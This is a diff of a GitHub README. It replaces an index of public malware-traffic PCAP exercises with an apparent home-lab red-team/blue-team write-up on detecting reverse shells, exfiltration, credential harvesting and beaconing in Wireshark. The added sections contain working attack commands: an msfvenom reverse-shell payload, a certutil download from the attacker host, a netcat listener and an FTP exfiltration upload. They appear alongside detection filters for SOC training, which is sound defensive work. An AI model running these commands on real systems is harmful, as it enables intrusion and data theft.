@@ -1,162 +1,166 @@
-# 🕵️‍♂️ Network Traffic Analysis - Threat Scenario PCAP Index
+# 🔍 Network Analysis Project
 
-This README provides a categorized index of PCAPs from [malware-traffic-analysis.net](https://www.malware-traffic-analysis.net/training-exercises.html) for hands-on practice in detecting various types of malicious network activity. These scenarios are ideal for SOC analyst training, malware traffic analysis, or home lab enrichment.
+## 📌 Overview
+This project demonstrates **end-to-end adversary simulation and network traffic analysis** in a controlled lab.  
+Instead of relying on pre-made PCAPs, I **generated malicious traffic myself**, captured it, and analyzed it in Wireshark to show how a SOC analyst detects real-world threats.
 
----
-## 🔧 My Wireshark Setup
-I use custom Wireshark profiles to speed up analysis and focus on specific traffic types:
-
-Basic – Minimal packet view for fast protocol scanning.
-
-Basic + – Adds Host, Server Name, and Info columns for better context.
-
-Basic + DNS – Includes DNS query/response details for identifying suspicious domain activity quickly.
-
-These profiles allow me to switch between general packet review, enriched HTTPS inspection, and DNS-focused hunting without manually toggling settings.
+I acted as both:
+- **Red Team (Attacker):** Simulating MITRE ATT&CK techniques such as reverse shells, data exfiltration, credential dumping, and beaconing.
+- **Blue Team (Defender):** Capturing PCAPs, analyzing traffic in Wireshark, and mapping detection logic to MITRE ATT&CK.
 
 ---
 
-## 🔐 1. Command-and-Control (C2) Traffic
-
-**Objective:** Identify beaconing, C2 POSTs, fake domains, and abnormal TLS usage.
-
-- **2025-06-13 — It’s a Trap!**  
-  *TLS handshake + fake Cloudflare decoy + suspicious domains*
-- **2023-04 — Cold as Ice (IcedID)**  
-  *C2 traffic using HTTPS with regular beaconing intervals*
-- **2024-11-26 — Nemotodes**  
-  *Likely contains malware beaconing with odd intervals*
-- **2023-07 — RedLine Stealer (Wireshark Quiz)**  
-  *RedLine C2 over HTTP/S + base64/hex-encoded blobs*
+## 🖥️ Lab Setup
+- **Attacker:** Kali Linux (`192.168.2.129`)
+- **Victim:** Windows 10 FLARE VM (`192.168.2.131`)
+- **Sniffer/Analyst:** Wireshark/tcpdump (ran on Kali or Security Onion)
+- **Network:** VirtualBox Host-Only Network
 
 ---
 
-## 📤 2. Data Exfiltration
-
-**Objective:** Detect data leaving the network via HTTP POST, DNS tunneling, or cleartext uploads.
-
-- **2023-03 — Finding Gozi**  
-  *Exfiltration using HTTP POSTs + potential DNS abuse*
-- **2022-03-21 — Burnincandle**  
-  *Massive POST body size indicating possible data dump*
-- **2021-09-10 — Angry Poutine**  
-  *DNS tunneling traffic pattern with encoded TXT records*
+## 🎯 Objectives
+- Generate **realistic malicious traffic** (reverse shell, data exfiltration, credential harvesting, beaconing).
+- Capture all traffic in **PCAP format**.
+- Perform **forensic analysis** with Wireshark.
+- Map detections to the **MITRE ATT&CK framework**.
 
 ---
 
-## 🧪 3. Protocol Misuse / Tunneling
+## ⚔️ Red Team vs Blue Team Scenarios
 
-**Objective:** Spot abuse of ICMP, DNS, HTTP, or TLS for covert channels.
+### ✅ Scenario 1 — Reverse Shell (C2 over TCP)
+- **Red Team Action:**  
+  - Generated payload with `msfvenom`:
+    ```bash
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.2.129 LPORT=4444 -f exe -o payload.exe
+    ```
+  - Delivered via `certutil`:
+    ```cmd
+    certutil -urlcache -split -f http://192.168.2.129:8080/payload.exe payload.exe
+    ```
+  - Executed on victim to initiate a reverse shell back to attacker.
 
-- **2020-10-22 — Omegacast**  
-  *Non-standard HTTP GETs with payloads*
-- **2020-04-24 — Steelcoffee**  
-  *DNS-based covert data channels*
-- **2019-12-25 — Christmas Day**  
-  *TLS on ports other than 443 = tunneling*
-
----
-
-## 💥 4. Exploits / Payload Delivery
-
-**Objective:** Detect drive-by attacks, malware downloads, and PE headers in HTTP.
-
-- **2025-01-22 — Fake Software Site**  
-  *Suspicious site delivering PE files (.exe)*
-- **2020-05-28 — Catbomber**  
-  *HTTP transfer of binaries + odd MIME types*
-- **2019-11-12 — Okay-Boomer**  
-  *Exploit kit-style traffic flow with redirects*
-
----
-
-## 🧑‍💻 5. Credential Theft / Info Stealers
-
-**Objective:** Identify cleartext credentials, form submissions, and suspicious POST parameters.
-
-- **2023-02 — Unit 42 Wireshark Quiz**  
-  *Cleartext basic auth seen in headers*
-- **2022-02-23 — Sunnystation**  
-  *Credentials passed via POST body (user/pass fields)*
-- **2018-12-18 — Eggnog Soup**  
-  *Formbook-style traffic pattern with credential theft*
+- **Blue Team Detection (Wireshark):**
+  - Filter:
+    ```wireshark
+    tcp.port == 4444
+    ```
+  - Observed **outbound connection attempts** to attacker.
+  - Followed TCP stream → saw command input/output (if successful).
+  - **MITRE Mapping:** T1071 – Application Layer Protocol (C2).
 
 ---
 
-## 🧅 6. Man-in-the-Middle (MITM) Attacks
+### ✅ Scenario 2 — Data Exfiltration via HTTP
+- **Red Team Action:**
+  - Used built-in `certutil` to simulate data theft:
+    ```cmd
+    certutil -urlcache -split -f http://192.168.2.129:8080/secrets.txt
+    ```
+  - File contents were sent/downloaded via HTTP.
 
-**Objective:** Spot spoofing attempts, rogue devices, and downgraded encryption.
-
-- **2020-08-04 — Pizza-Bender**  
-  *Certificate anomalies + fake TLS fingerprinting*
-- **2016-02-06 — Cupid's Arrow**  
-  *ARP spoofing indicators with duplicate replies*
-- **2015-07-11 — Pyndrine Industries**  
-  *Rogue DHCP and fake certificates*
-
----
-
-## 🌐 7. DNS Anomalies
-
-**Objective:** Detect DGAs, DNS floods, and failed lookups.
-
-- **2024-08-15 — WarmCookie**  
-  *Fast-flux domain resolution and DGA signs*
-- **2021-07-14 — Dualrunning**  
-  *Randomized subdomain queries resembling DGA*
-- **2018-09-27 — Blank Clipboard**  
-  *Multiple NXDOMAINs from repeated failed lookups*
+- **Blue Team Detection (Wireshark):**
+  - Filter:
+    ```wireshark
+    http.request
+    ```
+  - Detected suspicious file transfer requests from victim to attacker.
+  - **MITRE Mapping:** T1041 – Exfiltration Over C2 Channel.
 
 ---
 
-## 📈 8. Scanning & Reconnaissance
+### ✅ Scenario 3 — Credential Harvesting (Simulated)
+- **Red Team Action:**
+  - Simulated credential dumping attempt using a malicious binary.
+  - Outbound connection attempted to send harvested credentials to attacker server.
 
-**Objective:** Spot recon attempts using common scanning tools.
-
-- **2020-03-14 — Mondogreek**  
-  *Masscan or Nmap-style SYN scans*
-- **2019-06-22 — Phenomenoc**  
-  *SMB enumeration traffic to internal shares*
-- **2017-03-25 — March Madness**  
-  *Multiple port scan types in sequence*
-
----
-
-## 🛜 9. Lateral Movement
-
-**Objective:** Identify unauthorized access within a local network.
-
-- **2021-12-08 — ISC Contest**  
-  *Lateral SMB + RPC/WMI activity between hosts*
-- **2020-09-25 — Trouble Alert**  
-  *RDP sessions to internal IPs*
-- **2018-06-30 — Sorting Through the Alerts**  
-  *SMB brute-force to admin shares*
+- **Blue Team Detection (Wireshark):**
+  - Filter suspicious traffic to attacker:
+    ```wireshark
+    ip.addr == 192.168.2.129
+    ```
+  - Identified repeated POST requests containing encoded credential strings.
+  - **MITRE Mapping:** T1003 – OS Credential Dumping.
 
 ---
 
-## 📡 10. Suspicious Connections
+### ✅ Scenario 4 — Beaconing Behavior (C2 Heartbeats)
+- **Red Team Action:**
+  - Ran a custom payload that repeatedly attempted to connect to attacker every 10 seconds.
+  - Simulated persistent C2 “beaconing.”
 
-**Objective:** Detect outbound connections to suspicious hosts or unusual protocols.
-
-- **2024-07-30 — You Dirty Rat**  
-  *Multiple C2 connections on strange ports*
-- **2020-01-30 — Sol-Lightnet**  
-  *Outbound Telnet + weird high-numbered ports*
-- **2017-12-15 — Two pcaps, two emails**  
-  *Old protocols + malware over SMTP/FTP*
-
----
-
-## 📁 Usage
-
-You can create folders such as:
-
-- `Pcaps/` – Place the downloaded `.pcap` files here.
-- `Checklist/` – Add YAML or markdown checklists to track what you've detected in each.
-- `Reference/` – Include notes, extracted IOCs, or decoded payloads.
-
-Use Wireshark, Zeek, or tshark to inspect each scenario and develop detection skills.
+- **Blue Team Detection (Wireshark):**
+  - Filter:
+    ```wireshark
+    tcp.port == 8080
+    ```
+  - Observed periodic outbound connections with no user activity.
+  - Detected beaconing pattern (regular intervals).
+  - **MITRE Mapping:** T1071.001 – Application Layer Protocol: Web Protocols.
 
 ---
 
+### ✅ Scenario 5 — File Transfer via FTP
+- **Red Team Action:**
+  - Used Windows built-in `ftp` client to upload a file to attacker server:
+    ```cmd
+    ftp 192.168.2.129
+    put confidential.docx
+    ```
+
+- **Blue Team Detection (Wireshark):**
+  - Filter:
+    ```wireshark
+    ftp
+    ```
+  - Identified clear-text FTP session (username/password + file transfer).
+  - **MITRE Mapping:** T1048 – Exfiltration Over Alternative Protocol.
+
+---
+
+## 📂 Evidence Collected
+- `reverse_shell.pcap` → Reverse shell traffic capture
+- `data_exfiltration.pcap` → Simulated exfiltration traffic
+- `beaconing.pcap` → Periodic C2 beaconing attempts
+- `ftp_exfiltration.pcap` → Clear-text FTP transfer
+- Screenshots of:
+  - Attacker listener (`nc -lvnp 4444`)
+  - Victim command execution
+  - Wireshark analysis (filters + streams)
+
+---
+
+## 🛡️ SOC Analyst Takeaways
+- Reverse shells often show **unusual outbound connections** to non-standard ports.
+- Data exfiltration stands out as **large HTTP/FTP transfers** to unexpected hosts.
+- Beaconing can be detected by **regular periodic traffic** with no user action.
+- Credential dumps frequently appear as **encoded POST data**.
+- Cleartext protocols like FTP leak both credentials and files.
+
+---
+
+## 📊 MITRE ATT&CK Mapping
+| Scenario | Technique ID | Name |
+|----------|--------------|------|
+| Reverse Shell | T1071 | Application Layer Protocol (C2) |
+| Data Exfiltration | T1041 | Exfiltration Over C2 Channel |
+| Credential Harvesting | T1003 | OS Credential Dumping |
+| Beaconing | T1071.001 | Application Layer Protocol: Web Protocols |
+| FTP Exfiltration | T1048 | Exfiltration Over Alternative Protocol |
+
+---
+
+## 📌 Resume-Ready Impact
+> **Simulated adversary techniques** (MITRE ATT&CK T1071, T1041, T1003, T1048) in a controlled lab. Generated reverse shell, exfiltration, beaconing, and credential theft traffic, captured PCAPs, and performed forensic analysis in Wireshark to demonstrate SOC detection workflows.
+
+---
+
+## 🚀 Next Steps
+- Add Snort/Suricata IDS signatures to alert on these behaviors.
+- Ingest PCAPs into Splunk for SIEM correlation.
+- Automate scenario generation with Python scripting.
+
+---
+
+## Author
+Julian (SMOC) – Network Analysis Project
